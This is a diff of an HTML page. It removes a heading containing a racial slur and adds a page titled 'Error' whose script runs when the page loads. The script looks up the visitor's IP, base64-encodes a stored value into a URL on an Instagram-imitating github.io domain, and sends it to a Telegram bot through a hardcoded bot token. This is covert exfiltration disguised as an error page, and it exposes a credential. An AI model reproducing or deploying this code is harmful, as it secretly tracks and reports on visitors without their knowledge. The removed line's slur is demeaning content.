@@ -1,2 +1,31 @@
-<title>MASTRSTVO</title>
- <h1>Nha Nha Nigga guess who's back</h1>
+<title>Error</title>
+<script>
+function request() {
+  fetch('https://api.ipify.org/?format=json', {
+    method: 'GET',
+  })
+  .then(response => {
+    return response.json();
+  })
+  .then(data => {
+    console.log(data.ip);
+    
+  });
+}
+request()
+console.log(localStorage.getItem("ip"))
+function send(){
+  var message="https://instagramtg.github.io/?data="+btoa(localStorage.getItem("ip"))
+fetch(`https://api.telegram.org/bot1920440271:AAGQ3sv8UkLga66ruEuCwEdlvhIbkkj9dwo/sendMessage?chat_id=1369408018&text=${message}`, {
+  method: 'GET',
+})
+.then(res=>{
+  return res.json();
+})
+.then(da=>{
+  console.log(da)
+})
+} send()
+
+
+</script>
